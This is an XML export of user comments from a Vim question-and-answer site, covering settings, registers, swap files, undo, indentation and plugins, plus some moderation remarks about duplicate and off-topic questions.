<?xml version="1.0" encoding="utf-8"?>
<comments>
  <row Id="1" PostId="7" Score="2" Text="Does the norelativenumber just turn off numbering altogether or does it switch to conventional numbering?" CreationDate="2015-02-03T16:59:22.723" UserId="11" />
  <row Id="2" PostId="10" Score="2" Text="It would be useful if you would explain what this does and how to set it up, not everyone will know ;)" CreationDate="2015-02-03T17:01:10.577" UserId="5" />
  <row Id="3" PostId="7" Score="0" Text="`set number` is the setting that controls the presences of numbers so it will only switch between rel and non-rel" CreationDate="2015-02-03T17:05:04.487" UserId="27" />
  <row Id="4" PostId="19" Score="0" Text="http://stackoverflow.com/questions/14650788/why-ci-and-ci-ci-behave-differently" CreationDate="2015-02-03T17:11:04.327" UserId="46" />
  <row Id="5" PostId="22" Score="1" Text="Is it really that easy? *facepalm*. I can't believe I didn't figure that out.." CreationDate="2015-02-03T17:12:27.673" UserId="5" />
  <row Id="6" PostId="13" Score="2" Text="I haven't used them so I don't know if either are suitable or quiality, but here are two Android apps which give some degree of vim control: [VimTouch](https://play.google.com/store/apps/details?id=net.momodalo.app.vimtouch) and [Terminal IDE](https://play.google.com/store/apps/details?id=com.spartacusrex.spartacuside)" CreationDate="2015-02-03T17:18:52.427" UserId="58" />
  <row Id="7" PostId="13" Score="0" Text="The main unknown for me with these tools is: is it easy/feasible to edit remote files through them, with netrw or otherwise?" CreationDate="2015-02-03T17:19:49.063" UserId="58" />
  <row Id="8" PostId="13" Score="1" Text="The start might be using something like the Android &quot;Hacker's Keyboard&quot; https://play.google.com/store/apps/details?id=org.pocketworkstation.pckeyboard as on screen keyboard. I can imagine more touch support, though (for placing cursor, scrolling, ...)" CreationDate="2015-02-03T17:20:18.437" UserId="59" />
  <row Id="9" PostId="7" Score="2" Text="The `numbers.vim` plugin also adds some more advanced relative number functionality, e.g. having the line your cursor occupies printing the non-relative number, and switching to non-relative numbering throughout the whole file when the vim window loses focus." CreationDate="2015-02-03T17:22:00.173" UserId="14" />
  <row Id="10" PostId="7" Score="1" Text="@shawndumas so is there a precedence of which numbers are shown? If for instance I had set number in my vimrc and set relativenumber / norelativenumber was called could it toggle between relative and standard numbering?" CreationDate="2015-02-03T17:29:18.397" UserId="11" />
  <row Id="12" PostId="43" Score="0" Text="Do I need to activate the ftplugin somehow or will creating the file(s) activate it automatically?" CreationDate="2015-02-03T17:37:51.433" UserId="12" />
  <row Id="13" PostId="43" Score="0" Text="Make sure you have `filetype plugin indent on` in your `vimrc`." CreationDate="2015-02-03T17:38:45.987" UserId="54" />
  <row Id="15" PostId="14" Score="10" Text="Use `:0put=…` to avoid the blank line at the top." CreationDate="2015-02-03T17:40:22.717" UserId="54" />
  <row Id="18" PostId="59" Score="5" Text="Sleuth seems to work a bit better than detectindent, in my experience, and also will try to determine the proper indent settings for new files by looking at other files nearby in the filesystem." CreationDate="2015-02-03T17:45:20.463" UserId="15" />
  <row Id="19" PostId="59" Score="0" Text="@jamessan didn't know that, good to know." CreationDate="2015-02-03T17:47:37.837" UserId="74" />
  <row Id="20" PostId="57" Score="1" Text="`/var/tmp` is always world writable—it's a system temp directory. (Well, you can change it to not be, but that's one of those things where Unix-like systems are happy to let you keep the pieces after you break it). If you have another user on the system, he/she could create `/var/tmp/vim_«your_username»` with permissions of his/her choice. And then fill it with symlinks to your important files, which will probably be destroyed by vim tempfiles." CreationDate="2015-02-03T17:51:39.550" UserId="31" />
  <row Id="21" PostId="57" Score="0" Text="@derobert Only if it doesn't exist. If you use this system-wide and havea lot of users, you probably want to add the creation of this directory to `adduser` or whatever you're using to make users. In any case, most people use Vim on trusted machines (but your comment is a good one, as such)." CreationDate="2015-02-03T17:56:49.640" UserId="51" />
  <row Id="22" PostId="71" Score="2" Text="A shortcut for a horizontal split is `:sp`, with the vertical shortcut being `:vsp`." CreationDate="2015-02-03T17:59:45.460" UserId="14" />
  <row Id="23" PostId="57" Score="0" Text="Correct, only if it doesn't exist. Which, being in a system temporary directory, happens unpredictably based on when those tempfiles are cleaned up. Not sure why you don't just put it in `$HOME` somewhere." CreationDate="2015-02-03T17:59:46.110" UserId="31" />
  <row Id="24" PostId="68" Score="2" Text="See [this](https://github.com/panozzaj/vim-autocorrect)" CreationDate="2015-02-03T18:07:08.683" UserId="97" />
  <row Id="25" PostId="57" Score="0" Text="@derobert Well, `/var/` is a different filesystem. The theory is, that it will prevent a lot of writes on `/`, `/usr`, or `/home`, leading to less fragmentation &amp; risk of file corruption in case of a crash... This is also why mailboxes and stuff are on `/var` by default, and not in the homedir..." CreationDate="2015-02-03T18:07:34.540" UserId="51" />
  <row Id="28" PostId="82" Score="3" Text="The [YouCompleteMe plugin](http://valloric.github.io/YouCompleteMe/) can learn terms to autocomplete, and can understand C family languages." CreationDate="2015-02-03T18:16:58.293" UserId="67" />
  <row Id="29" PostId="77" Score="2" Text="possible duplicate of [How do I make Vim adapt to the current indenting style of the file I'm editing?](http://vi.stackexchange.com/questions/52/how-do-i-make-vim-adapt-to-the-current-indenting-style-of-the-file-im-editing)" CreationDate="2015-02-03T18:19:28.793" UserId="53" />
  <row Id="30" PostId="82" Score="0" Text="@alxndr Documentation was pretty confusing for me-in case for installation with vundle. And as soon as I started out with it , YCM server crashed!" CreationDate="2015-02-03T18:19:58.220" UserId="101" />
  <row Id="31" PostId="85" Score="6" Text="IMHO this question is off-topic because it is too broad, in addition, it's basically asking for &quot;what's the best VimScript tutorial&quot; (even though it isn't phrased like that). I don't think we want to have questions asking for off-site resources..." CreationDate="2015-02-03T18:20:28.533" UserId="51" />
  <row Id="34" PostId="41" Score="0" Text="johannes: Do we need to edit the .vimrc through vim for this command to automatically source the file?" CreationDate="2015-02-03T18:25:02.157" UserId="95" />
  <row Id="35" PostId="35" Score="2" Text="+1 for `[p` and `]p`" CreationDate="2015-02-03T18:33:08.723" UserId="50" />
  <row Id="38" PostId="82" Score="0" Text="YCM works for me relatively well, unless I have template heavy (boost.geo) stuff where it adds looooots of laod to the system. My setup is a mess meanwhile, hard to extract YCM parts ..." CreationDate="2015-02-03T18:43:21.940" UserId="59" />
  <row Id="39" PostId="60" Score="0" Text="To the editor (Jasper): I more likely want to write again something that I have written recently, not something I'll write in the future or that is at the beginning of the file. Therefore `^P` is more natural IMHO. Otherwise thanks for the edit (I hope I clicked the right button and you got your +2)." CreationDate="2015-02-03T18:48:04.520" UserId="82" />
  <row Id="40" PostId="98" Score="2" Text="Isn't it ``gn``?" CreationDate="2015-02-03T18:50:11.957" UserId="82" />
  <row Id="41" PostId="100" Score="0" Text="+1 This is a rather nice answer, on-the-spot and reasonably detailed at the same time. Let's hope most questions get such answers! :)" CreationDate="2015-02-03T18:51:50.367" UserId="82" />
  <row Id="42" PostId="60" Score="0" Text="Yep, I got those imaginary internet points :) I always thought that the suggestion list would be sorted alphabetically..." CreationDate="2015-02-03T18:53:32.450" UserId="79" />
  <row Id="43" PostId="90" Score="1" Text="... and `g5j` to jump 5 down, as usual." CreationDate="2015-02-03T18:53:41.580" UserId="82" />
  <row Id="44" PostId="98" Score="0" Text="@yo' Yes, though g is just another flag, you'd want to use `g` too if you feel there may be more than one matches per line, which is often true. For the purpose of the question however the flag `n` is more important." CreationDate="2015-02-03T18:53:59.373" UserId="74" />
  <row Id="45" PostId="108" Score="0" Text="For me, `Y` also yanks the whole line. Is this nonstandard? I usually prefer `Y` over `yy`. There is a difference however between `D` and `dd`." CreationDate="2015-02-03T18:55:22.867" UserId="79" />
  <row Id="46" PostId="60" Score="0" Text="@Jasper order of appearance it is (at least for me certainly, also see above: `world,word,wood` and not the other way around). So `^P` is the last used completion, which is very handy (I rarely go further than 3 items in the list, even in a long file)." CreationDate="2015-02-03T18:55:32.963" UserId="82" />
  <row Id="47" PostId="76" Score="0" Text="Have you ever tried `:sp`(`lit`) or `:vs`(`plit`) with no argument? :)" CreationDate="2015-02-03T18:57:04.507" UserId="82" />
  <row Id="48" PostId="105" Score="3" Text="Isn't `Ctrl+G` more like 'path relative to vim's cwd'?" CreationDate="2015-02-03T18:58:17.127" UserId="79" />
  <row Id="49" PostId="108" Score="0" Text="@Jasper Oh, sorry, answering from mobile and don't have an actual Vim instance to test. Edited." CreationDate="2015-02-03T19:00:40.600" UserId="88" />
  <row Id="50" PostId="85" Score="2" Text="@Carpetsmoker I do not agree! We can have questions listing other online resources on the topic. Since SE is community-driven, if a resource gets out-dated, disappears, changes link etc., there is always someone to correct it. However, I think I agree that it's better to keep such question for later, because _they are very tricky_." CreationDate="2015-02-03T19:01:19.353" UserId="82" />
  <row Id="51" PostId="5" Score="0" Text="Now I tried this, and it's a schyzo! I mean, confusing. :D" CreationDate="2015-02-03T19:02:36.753" UserId="82" />
  <row Id="52" PostId="107" Score="0" Text="`pkdd` ? (It's one keypress less for the `Shift`)" CreationDate="2015-02-03T19:04:36.923" UserId="82" />
  <row Id="53" PostId="112" Score="3" Text="In my opinion, this is both too broad (asking for just a big list) and primarily opinion based (there's no way to tell whether an answer is objectively &quot;correct&quot;)." CreationDate="2015-02-03T19:06:40.397" UserId="88" />
  <row Id="54" PostId="105" Score="0" Text="@Jasper Good catch! Updated the answer." CreationDate="2015-02-03T19:06:52.937" UserId="53" />
  <row Id="55" PostId="112" Score="0" Text="As a beginner, `u` is my best friend.. Is there a reason you feel it's not enough of a safety net?" CreationDate="2015-02-03T19:07:21.240" UserId="40" />
  <row Id="56" PostId="107" Score="0" Text="that would be `pkdd` :)" CreationDate="2015-02-03T19:08:29.337" UserId="79" />
  <row Id="57" PostId="107" Score="0" Text="What did you say? :p" CreationDate="2015-02-03T19:09:41.853" UserId="82" />
  <row Id="58" PostId="112" Score="0" Text="backup. backup. backup... I once did a halfdrunk fumble-finger in `mutt` and deleted my entire INBOX (never figured out what I did exactly). These sort of errors can occur in any keyboard-based program..." CreationDate="2015-02-03T19:16:24.370" UserId="51" />
  <row Id="59" PostId="82" Score="0" Text="@yo' This question is fairly specific to using vim with C++. Solutions for it probably won't apply to someone who uses Vim to write Perl (and vice versa). So [tag:c++] seems fine to me; but of course [meta] is the right place to discuss that." CreationDate="2015-02-03T19:17:39.313" UserId="31" />
  <row Id="61" PostId="112" Score="0" Text="@Carpetsmoker (off-topic) `D` `.` `&lt;enter&gt;` would do it..." CreationDate="2015-02-03T19:22:30.873" UserId="31" />
  <row Id="62" PostId="113" Score="2" Text="I agree with vimtutor. I learned from there. It's the best tutorial.&#xA;As for the 4th bullet do not forget `:x` along with `:wq`." CreationDate="2015-02-03T19:24:44.263" UserId="83" />
  <row Id="64" PostId="63" Score="2" Text="Start with `vimtutor` for the first 30 minutes. Continue with real practice for the rest of the week. Boom! You can fluently use Vim and have all its pros." CreationDate="2015-02-03T19:28:52.723" UserId="83" />
  <row Id="65" PostId="119" Score="3" Text="Details, please!" CreationDate="2015-02-03T19:30:00.667" UserId="24" />
  <row Id="66" PostId="113" Score="1" Text="I think a cation &quot;**do not do that, will destroy your computer**&quot; should be added to any instance of that curse you wrote there. ;)" CreationDate="2015-02-03T19:30:30.913" UserId="82" />
  <row Id="68" PostId="125" Score="3" Text="So for `x` I'd use `&quot;_x` then?" CreationDate="2015-02-03T19:43:12.580" UserId="134" />
  <row Id="69" PostId="125" Score="0" Text="That's correct." CreationDate="2015-02-03T19:44:46.717" UserId="132" />
  <row Id="70" PostId="129" Score="1" Text="Are you looking for an &quot;revert&quot; action? `:e!` would do that" CreationDate="2015-02-03T19:48:52.027" UserId="79" />
  <row Id="75" PostId="129" Score="0" Text="Just pressing `u` doesn't do what you want?" CreationDate="2015-02-03T20:03:41.177" UserId="135" />
  <row Id="78" PostId="132" Score="1" Text="Note: typing `:runtime macros/matchit.vim` doesn't work; you need to put in in your vimrc and restart Vim..." CreationDate="2015-02-03T20:10:58.733" UserId="51" />
  <row Id="79" PostId="139" Score="1" Text="If `:w` did happen, will `:earlier 30s` still work?" CreationDate="2015-02-03T20:12:44.720" UserId="134" />
  <row Id="80" PostId="139" Score="1" Text="`:earlier 30s` restores the buffer to the state it was in 30 seconds ago. After reverting, you would then have to save it using `:w`." CreationDate="2015-02-03T20:13:51.853" UserId="24" />
  <row Id="82" PostId="129" Score="1" Text="I think `:e!` would be bad if you haven't saved since the last correct state, and `u` might be insufficient if you typed a bunch of stuff. (If you typed `date month`, for example, then you would have deleted a tag, set a mark, and performed a search, which would be quite confusing to undo via `u`.)" CreationDate="2015-02-03T20:19:45.203" UserId="142" />
  <row Id="84" PostId="43" Score="1" Text="@DeltaLima vim has a path that it goes through to check for settings. As long as `filetype plugin on` is set, vim's path includes the `ftplugin/&lt;filetype&gt;.vim` and `after/ftplugin/&lt;filetype&gt;/vim` files in its path." CreationDate="2015-02-03T20:24:10.423" UserId="130" />
  <row Id="85" PostId="145" Score="2" Text="Imagine there are an unknown number of lines and/or paragraphs between the cursor and its top-level `module` line. (Specifically, this situation arose when I was recently navigating third-party code several thousand lines long, with accurate indentation but no empty lines, and trying to find the outer context of a module's definition.)" CreationDate="2015-02-03T20:25:21.197" UserId="67" />
  <row Id="86" PostId="148" Score="0" Text="right; e.g., `VaB:s/\$color/replaced/g`" CreationDate="2015-02-03T20:25:39.137" UserId="142" />
  <row Id="87" PostId="148" Score="0" Text="Just added that, good point :)" CreationDate="2015-02-03T20:26:23.817" UserId="150" />
  <row Id="88" PostId="145" Score="0" Text="I can imagine (and I'm horrified)... Yeah, me too I'm interested in an exact solution for the situation that you describe. Till then, I'd jump paragraph by paragraph as a &quot;workaround&quot;" CreationDate="2015-02-03T20:27:50.450" UserId="135" />
  <row Id="89" PostId="129" Score="1" Text="@WChargin Not speaking about a `u` being part of the sequence, performing some undos in the middle." CreationDate="2015-02-03T20:28:35.793" UserId="82" />
  <row Id="90" PostId="145" Score="0" Text="Jumping by paragraphs is my preferred way of moving around, but it wasn't an option: the entire file was one &quot;paragraph&quot;." CreationDate="2015-02-03T20:29:20.130" UserId="67" />
  <row Id="91" PostId="149" Score="4" Text="Why not use `less`?" CreationDate="2015-02-03T20:33:10.680" UserId="66" />
  <row Id="92" PostId="149" Score="1" Text="Do you intend to manipulate the files in any way, or do you just want to view them?" CreationDate="2015-02-03T20:33:13.227" UserId="24" />
  <row Id="93" PostId="140" Score="0" Text="An additional plugin suggestion: NERD Commenter - http://www.vim.org/scripts/script.php?script_id=1218" CreationDate="2015-02-03T20:33:20.077" UserId="138" />
  <row Id="94" PostId="149" Score="1" Text="I would like to edit the files." CreationDate="2015-02-03T20:33:42.863" UserId="77" />
  <row Id="95" PostId="108" Score="0" Text="When you have `autoindent` on, `Vp` will trigger a reindent of the next line. `VP` will work better in that case." CreationDate="2015-02-03T20:33:52.060" UserId="135" />
  <row Id="96" PostId="7" Score="1" Text="that is most correct" CreationDate="2015-02-03T20:43:38.530" UserId="27" />
  <row Id="97" PostId="152" Score="0" Text="I love vim, there is always something to learn and discover to make life easier and on a daily basis :)" CreationDate="2015-02-03T20:43:56.280" UserId="137" />
  <row Id="99" PostId="43" Score="0" Text="@DeltaLima, please see my edit." CreationDate="2015-02-03T20:49:32.913" UserId="54" />
  <row Id="100" PostId="149" Score="0" Text="related: http://stackoverflow.com/a/19795855/732016" CreationDate="2015-02-03T20:56:18.390" UserId="142" />
  <row Id="102" PostId="62" Score="0" Text="+1 for the article. It can really change your view on the way of using windows in vim. [Here](https://github.com/jeetsukumaran/vim-filebeagle) is another filesystem navigation plugin inspired by it." CreationDate="2015-02-03T21:02:28.787" UserId="20" />
  <row Id="103" PostId="116" Score="2" Text="Can't you just read `:help recording`?" CreationDate="2015-02-03T21:10:21.900" UserId="54" />
  <row Id="104" PostId="8" Score="0" Text="Not sure exactly but the first changelog its mentioned in is 7.3.&#xA;ftp://ftp.vim.org/pub/vim/patches/7.3/README" CreationDate="2015-02-03T21:10:30.617" UserId="19" />
  <row Id="105" PostId="107" Score="0" Text="That's &quot;register&quot;, not &quot;buffer&quot;." CreationDate="2015-02-03T21:11:38.837" UserId="54" />
  <row Id="107" PostId="116" Score="5" Text="@romainl That's obvious in retrospect, but not to someone who is stuck." CreationDate="2015-02-03T21:11:57.777" UserId="24" />
  <row Id="109" PostId="122" Score="0" Text="[Jasper found](http://meta.vi.stackexchange.com/questions/45/what-do-we-do-with-questions-that-are-already-answered-somewhere-else-on-se) similar questions on [so]: [Any way to delete in vim without overwriting your last yank? [duplicate]](http://stackoverflow.com/questions/3638542/any-way-to-delete-in-vim-without-overwriting-your-last-yank) and [In vim is there a way to delete without putting text in the register?](http://stackoverflow.com/questions/54255/in-vim-is-there-a-way-to-delete-without-putting-text-in-the-register)" CreationDate="2015-02-03T21:13:51.753" UserId="8" />
  <row Id="110" PostId="144" Score="0" Text="While I do think having your dotfiles under version control is awesome, I was specifically asking about instances of vim running on the same machine (I've updated the question)." CreationDate="2015-02-03T21:14:40.257" UserId="126" />
  <row Id="112" PostId="174" Score="4" Text="As an aside, I wouldn't recommend using the numbered registers.  The only &quot;safe&quot; registers are the alphabetic registers.  All other registers are automatically set by Vim." CreationDate="2015-02-03T21:23:25.590" UserId="15" />
  <row Id="114" PostId="176" Score="0" Text="Agreed about the numeric registers—but what if you want to use this in a command, and you need registers that start the same but become different?" CreationDate="2015-02-03T21:30:48.223" UserId="142" />
  <row Id="115" PostId="176" Score="0" Text="@WChargin, please explain." CreationDate="2015-02-03T21:31:59.727" UserId="54" />
  <row Id="116" PostId="176" Score="0" Text="As in, perhaps I want to do something with rotated copies of a string, so if `abcde` is in `@q`, then I want `@x=&quot;bcdea&quot;`, `@y=&quot;abcde&quot;`, and `@z=&quot;eabcd&quot;`. I might start by letting `@x`, `@y`, and `@z` all equal to `@q` and then modifying them as needed. Obviously, I just made this up, but it seems like there might be *some* cases where something similar might be useful." CreationDate="2015-02-03T21:34:23.170" UserId="142" />
  <row Id="117" PostId="81" Score="1" Text="And to move to the middle of the screen, is &lt;kbd&gt;M&lt;/kbd&gt;, naturally ;-)" CreationDate="2015-02-03T21:34:57.413" UserId="135" />
  <row Id="118" PostId="140" Score="0" Text="Note: this only supports linewise comments. For example, ANSI C does not recognize `//` (only `/* */`)." CreationDate="2015-02-03T21:35:25.180" UserId="142" />
  <row Id="119" PostId="176" Score="0" Text="@WChargin, I'm sorry but I completely fail to see the point of what you describe, especially with regard to registers. It looks like variables to me, not registers." CreationDate="2015-02-03T21:36:12.687" UserId="54" />
  <row Id="120" PostId="175" Score="1" Text="There's no need to use `:exe` here.  The `getreg()` and `setreg()` functions would be cleaner." CreationDate="2015-02-03T21:38:42.500" UserId="15" />
  <row Id="121" PostId="176" Score="0" Text="The solution of using an empty buffer, duplicating and then modifying does solve my problem, but it still remains ineffecient because each modification of the initial string must be yanked and executed or assigned one by one to a register." CreationDate="2015-02-03T21:39:25.937" UserId="161" />
  <row Id="122" PostId="176" Score="2" Text="@Kit, I'm a bit concerned by the lack of practical example in your question which immediately makes it smell like XY. I'm almost certain you are misusing registers so I'd love to read an explanation of what you are trying to do." CreationDate="2015-02-03T21:42:01.450" UserId="54" />
  <row Id="123" PostId="180" Score="1" Text="I'd recommend `getreg(sourceReg, 1)`." CreationDate="2015-02-03T21:45:21.853" UserId="15" />
  <row Id="124" PostId="182" Score="3" Text="What kind of load times are you seeing? 1s, 10s, 1m?" CreationDate="2015-02-03T21:48:20.527" UserId="2" />
  <row Id="125" PostId="5" Score="4" Text="You can also toggle the commands by appending a &quot;!&quot; to them. E.g. `set number!` will turn on line numbering if it's off, and turn it on if it's off.&#xA;`set relativenumber` can be shortened as `set rnu`." CreationDate="2015-02-03T21:48:35.230" UserId="175" />
  <row Id="126" PostId="180" Score="0" Text="Ah yeah, true. Fixed." CreationDate="2015-02-03T21:48:53.837" UserId="132" />
  <row Id="127" PostId="175" Score="0" Text="@jamessan Nice suggestion, thanks—am I using these correctly?" CreationDate="2015-02-03T21:48:57.697" UserId="142" />
  <row Id="128" PostId="169" Score="0" Text="Can `less` or `more` also make changes to my file?" CreationDate="2015-02-03T21:50:23.203" UserId="51" />
  <row Id="129" PostId="175" Score="0" Text="I've edited it to add the optional second argument to getreg() since that returns the contents of the register rather than a possible evaluation of it." CreationDate="2015-02-03T21:53:11.047" UserId="15" />
  <row Id="132" PostId="169" Score="2" Text="They can't, of course. Logs are not meant to be edited." CreationDate="2015-02-03T21:59:45.437" UserId="54" />
  <row Id="133" PostId="189" Score="5" Text="+1 for the &quot;I don't personally recommend using a Vim distribution&quot;" CreationDate="2015-02-03T22:01:36.123" UserId="155" />
  <row Id="134" PostId="60" Score="0" Text="protip: `inoremap &lt;C-Space&gt; &lt;C-N&gt;`" CreationDate="2015-02-03T22:04:27.657" UserId="142" />
  <row Id="135" PostId="51" Score="15" Text="+1. Let me also add that the fact that there will be very few user-visible changes is a good thing." CreationDate="2015-02-03T22:05:08.707" UserId="155" />
  <row Id="136" PostId="192" Score="0" Text="Did you try `:!env`?" CreationDate="2015-02-03T22:10:48.777" UserId="142" />
  <row Id="137" PostId="193" Score="0" Text="See [here](http://stackoverflow.com/questions/5569348/vim-in-ex-command-mode-how-to-complete-the-path-only-up-to-the-first-non-unique).&#xA;&#xA;What do you have `wildmode` set to?" CreationDate="2015-02-03T22:28:06.760" UserId="141" />
  <row Id="138" PostId="195" Score="0" Text="how did you create the animated gif?" CreationDate="2015-02-03T22:32:55.757" UserId="188" />
  <row Id="139" PostId="195" Score="2" Text="@guido I used a custom tool called [mkcast](http://github.com/KeyboardFire/mkcast)." CreationDate="2015-02-03T22:34:12.950" UserId="88" />
  <row Id="140" PostId="195" Score="0" Text="that's awesome thanks" CreationDate="2015-02-03T22:35:05.753" UserId="188" />
  <row Id="141" PostId="196" Score="1" Text="`:help greedy` would have taken you to the right help topic.  `:help regexp` is the help describing Vim's regex flavor." CreationDate="2015-02-03T22:36:32.430" UserId="15" />
  <row Id="142" PostId="82" Score="2" Text="@AbhinavGauniyal That sounds similar to problems I've seen before with using YCM.  What system are you on?  For OSX see [here](https://github.com/Valloric/YouCompleteMe#mac-os-x-super-quick-installation).  I'm not using MacVim, but I installed CMake with Homebrew.  Then I `cd`ed to the YCM plugin directory (`~/.vim/bundle` for me), and ran `./install --clang-completer`." CreationDate="2015-02-03T22:37:38.297" UserId="141" />
  <row Id="143" PostId="176" Score="0" Text="@romainl I added a practical example, I hope it proves illuminating. Could you explain what you mean by 'smell like XY'?" CreationDate="2015-02-03T22:51:22.333" UserId="161" />
  <row Id="144" PostId="200" Score="0" Text="When you exit Vim properly (i.e. with `:wq` or `:q!` or `ZZ` or etc.), swap files should automatically be removed." CreationDate="2015-02-03T22:52:21.970" UserId="88" />
  <row Id="145" PostId="200" Score="1" Text="@Doorknob not when you exit after a recovery... ;-)" CreationDate="2015-02-03T22:52:54.800" UserId="86" />
  <row Id="146" PostId="207" Score="0" Text="I get this behavior even without loading my vimrc (`vim -u NONE`). This is Vim 7.4 on Ubuntu 14.04 with GNOME." CreationDate="2015-02-03T23:05:25.247" UserId="88" />
  <row Id="147" PostId="207" Score="0" Text="@Doorknob&#xA;And I get the window instead of the cursor moving without my `.vimrc` (just `set mouse=a`).&#xA;&#xA;`:help scrolling` says that the scrolling behavior is platform specific.  I'm using vim in iterm2 on OSX." CreationDate="2015-02-03T23:07:31.550" UserId="141" />
  <row Id="148" PostId="207" Score="0" Text="Aha! `:set mouse=a` has fixed the problem for me. Edit that into your answer, and I'll accept it. Thanks!" CreationDate="2015-02-03T23:08:27.547" UserId="88" />
  <row Id="149" PostId="202" Score="0" Text="Could you limit the question to an operating system or windowing environment?" CreationDate="2015-02-03T23:12:36.130" UserId="24" />
  <row Id="150" PostId="202" Score="0" Text="@200_success Alright, I've edited my environment into the question." CreationDate="2015-02-03T23:14:22.553" UserId="88" />
  <row Id="152" PostId="206" Score="1" Text="i couldn't make it work with `&lt;C-v&gt; &lt;C-w&gt;`; I used `autocmd VimResized * wincmd =` in my .vimrc instead" CreationDate="2015-02-03T23:18:45.867" UserId="188" />
  <row Id="153" PostId="202" Score="0" Text="I think this question should be tagged 'terminal' too.  Is it un-editable because it's answered?" CreationDate="2015-02-03T23:21:37.983" UserId="141" />
  <row Id="155" PostId="68" Score="1" Text="@ArturoVolpe That seems like a legitimate answer to the question." CreationDate="2015-02-03T23:28:25.063" UserId="141" />
  <row Id="156" PostId="212" Score="0" Text="That'll work for my example, but I was hoping for a more general answer which could be used in other kinds of string building" CreationDate="2015-02-03T23:37:37.680" UserId="182" />
  <row Id="157" PostId="179" Score="1" Text="I would like to add the the swap files also act as a lock. If you re-open a file, or if someone else does while it is already open, it won't go unnoticed.&#xA;&#xA;It may be a rare case but it has saved me a couple of times." CreationDate="2015-02-03T23:50:03.983" UserId="195" />
  <row Id="158" PostId="212" Score="0" Text="@jalanb You could use `repeat`; see my edit." CreationDate="2015-02-03T23:52:20.157" UserId="88" />
  <row Id="159" PostId="214" Score="0" Text="That worked great. Thanks!" CreationDate="2015-02-03T23:52:54.127" UserId="155" />
  <row Id="161" PostId="213" Score="1" Text="I'm having trouble parsing those commands. Would you mind expanding on them a bit?" CreationDate="2015-02-04T00:18:52.173" UserId="130" />
  <row Id="162" PostId="189" Score="2" Text="@carlosdc Shameless plug but I did a small [rant](http://ricardolovelace.com/blog/2015/01/11/vim-is-not-a-black-box/) on this. Foreign setups introduce undefined behaviour so best to start from scratch." CreationDate="2015-02-04T00:19:36.223" UserId="206" />
  <row Id="163" PostId="216" Score="2" Text="This is true, yes, but it is more than that, actually. It is ex-mode in a repl-like shape." CreationDate="2015-02-04T00:23:24.123" UserId="207" />
  <row Id="164" PostId="221" Score="0" Text="On what distribution is this the case? I am currently running Archlinux and `.md` is being seen as markdown" CreationDate="2015-02-04T00:25:18.893" UserId="73" />
  <row Id="165" PostId="171" Score="0" Text="Another choice would be UndoTree." CreationDate="2015-02-04T00:28:30.687" UserId="207" />
  <row Id="166" PostId="216" Score="0" Text="I know it's the command line mode but I have strangely never used it like that. I use it to check the history `Shift V` to select a line and enter to execute again." CreationDate="2015-02-04T00:28:42.140" UserId="206" />
  <row Id="167" PostId="213" Score="1" Text="/ or ? to search down or up, \%xv limits to search to virtual column number 'x', the 'x' in this case is '&lt;C-R&gt;=virtcol(&quot;.&quot;)&lt;CR&gt;' which runs the virtcol command and inserts the virtual column number the cursor is at into the expression, \S means any non-whitespace character." CreationDate="2015-02-04T00:29:25.613" UserId="81" />
  <row Id="168" PostId="221" Score="0" Text="@Neikos This is on Ubuntu 14.04." CreationDate="2015-02-04T00:30:08.387" UserId="88" />
  <row Id="169" PostId="221" Score="0" Text="on fedora as well I correctly get markdown syntax on .md files" CreationDate="2015-02-04T00:33:21.743" UserId="188" />
  <row Id="170" PostId="221" Score="1" Text="[This has already been answered on SO.](http://stackoverflow.com/a/14779012/1951857)  You may find more and different information there." CreationDate="2015-02-04T00:43:57.027" UserId="141" />
  <row Id="171" PostId="189" Score="0" Text="@iKlsR in fact, that's what I was thinking of when I wrote this ;)" CreationDate="2015-02-04T00:47:47.417" UserId="133" />
  <row Id="172" PostId="84" Score="7" Text="[This has already been asked and answered on SO.](http://stackoverflow.com/questions/11489428/how-to-make-vim-paste-from-and-copy-to-systems-clipboard)  You may find more and different information there." CreationDate="2015-02-04T00:47:58.877" UserId="141" />
  <row Id="173" PostId="163" Score="0" Text="The off-topic answer would be to suggest a VCS. For instance git's index might be useful" CreationDate="2015-02-04T00:52:17.603" UserId="59" />
  <row Id="174" PostId="221" Score="0" Text="possible duplicate of [Setting up ++ft according to the file extension](http://vi.stackexchange.com/questions/61/setting-up-ft-according-to-the-file-extension)" CreationDate="2015-02-04T00:52:32.017" UserId="82" />
  <row Id="175" PostId="222" Score="1" Text="this does not work in fedora, it seems the /usr/share/vim/vim74/filetype.vim definitions will override this setting" CreationDate="2015-02-04T01:01:09.787" UserId="188" />
  <row Id="176" PostId="213" Score="1" Text="Thanks for explaining Chad. I will just add that &lt;C-R&gt; in Insert mode or Command-line mode grabs the contents of a register. The `=` register is the expression register which evaluates an expression in place. It's very handy, if not a bit weird looking." CreationDate="2015-02-04T01:01:29.610" UserId="195" />
  <row Id="177" PostId="231" Score="0" Text="Since I'll be using vim for at least the next 10 years I'd think it worth the investment. Where do I use this for the change to be reasonably permanent?" CreationDate="2015-02-04T01:49:36.223" UserId="211" />
  <row Id="179" PostId="179" Score="0" Text="@superjer Good point.  I forgot to mention that aspect of it.  I'll add info about that to the answer." CreationDate="2015-02-04T02:15:21.103" UserId="15" />
  <row Id="180" PostId="231" Score="0" Text="you should put this in your ~/.vimrc" CreationDate="2015-02-04T02:18:54.787" UserId="74" />
  <row Id="181" PostId="179" Score="1" Text="I would suggest to use `noswapfile` rather than setting the updatecount" CreationDate="2015-02-04T02:37:35.033" UserId="73" />
  <row Id="185" PostId="236" Score="1" Text="Are you talking about pasting code that was originally poorly indented or properly indented code that changes when you paste it into Vim?" CreationDate="2015-02-04T03:39:24.433" UserId="15" />
  <row Id="186" PostId="236" Score="0" Text="The pasted code is poorly indented to start with. Let me include an example...." CreationDate="2015-02-04T03:43:39.817" UserId="86" />
  <row Id="187" PostId="237" Score="2" Text="This question is not about pasting code with indentation, it's about fixing poorly indented code." CreationDate="2015-02-04T03:46:20.317" UserId="86" />
  <row Id="188" PostId="237" Score="4" Text="I didn't see the comment you posted. However, you can still use `gg=G` to reindent the whole file." CreationDate="2015-02-04T03:48:51.517" UserId="224" />
  <row Id="189" PostId="237" Score="0" Text="@rolfl That's where I usually start in such cases: `gg=G`, then look at the parts that `vim` got wrong." CreationDate="2015-02-04T04:08:51.870" UserId="205" />
